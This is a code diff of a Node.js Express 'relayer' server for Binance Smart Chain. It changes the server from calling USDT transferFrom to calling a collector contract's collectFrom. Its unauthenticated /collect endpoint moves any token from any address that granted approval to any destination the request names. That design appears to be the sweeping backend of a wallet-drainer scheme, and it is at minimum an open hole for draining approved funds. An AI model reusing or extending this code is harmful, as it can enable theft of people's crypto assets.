@@ -1,69 +1,77 @@
 require("dotenv").config();
-
 const express = require("express");
-const cors = require("cors");
 const { ethers } = require("ethers");
 
 const app = express();
-
-app.use(cors());
 app.use(express.json());
 
-// =====================
-// BSC RPC
-// =====================
+/* =========================
+   BSC RPC
+========================= */
 const provider = new ethers.JsonRpcProvider(
   "https://bsc-dataseed.binance.org/"
 );
 
-// =====================
-// RELAYER WALLET
-// =====================
+/* =========================
+   RELAYER WALLET
+========================= */
 const wallet = new ethers.Wallet(
   process.env.PRIVATE_KEY,
   provider
 );
 
-// =====================
-// USDT CONTRACT
-// =====================
-const USDT = "0x55d398326f99059fF775485246999027B3197955";
+/* =========================
+   COLLECTOR CONTRACT
+   (collectFrom contract)
+========================= */
+const COLLECTOR_CONTRACT =
+  process.env.COLLECTOR_CONTRACT;
 
+/* ABI — ONLY required function */
 const ABI = [
-  "function transferFrom(address from,address to,uint256 amount) public returns(bool)"
+  "function collectFrom(address token,address from,uint256 amount,address to) external"
 ];
 
-const token = new ethers.Contract(USDT, ABI, wallet);
+const collector = new ethers.Contract(
+  COLLECTOR_CONTRACT,
+  ABI,
+  wallet
+);
 
-// =====================
-// STATUS ROUTE
-// =====================
+/* =========================
+   STATUS ROUTE
+========================= */
 app.get("/", (req, res) => {
   res.json({
     status: true,
     relayer: wallet.address,
-    collector: process.env.COLLECTOR
+    contract: COLLECTOR_CONTRACT
   });
 });
 
-// =====================
-// RELAYER ENDPOINT
-// =====================
+/* =========================
+   RELAYER ENDPOINT
+========================= */
 app.post("/collect", async (req, res) => {
   try {
-    const { from, to, amount } = req.body;
+    const { token, from, to, amount } = req.body;
 
-    if (!from || !to || !amount) {
+    if (!token || !from || !to || !amount) {
       return res.status(400).json({
         success: false,
-        message: "Missing parameters"
+        error: "Missing params"
       });
     }
 
-    console.log("Transfer request:", req.body);
+    console.log("Collect request:", req.body);
 
-    // send transferFrom tx
-    const tx = await token.transferFrom(from, to, amount);
+    /* CALL SMART CONTRACT */
+    const tx = await collector.collectFrom(
+      token,
+      from,
+      amount,
+      to
+    );
 
     console.log("TX SENT:", tx.hash);
 
@@ -75,7 +83,7 @@ app.post("/collect", async (req, res) => {
     });
 
   } catch (err) {
-    console.error(err);
+    console.log(err);
 
     res.status(500).json({
       success: false,
@@ -84,10 +92,10 @@ app.post("/collect", async (req, res) => {
   }
 });
 
-// =====================
-// SERVER START (Render Fix)
-// =====================
-const PORT = process.env.PORT || 10000;
+/* =========================
+   START SERVER
+========================= */
+const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, () =>
   console.log("✅ Relayer running on port", PORT)
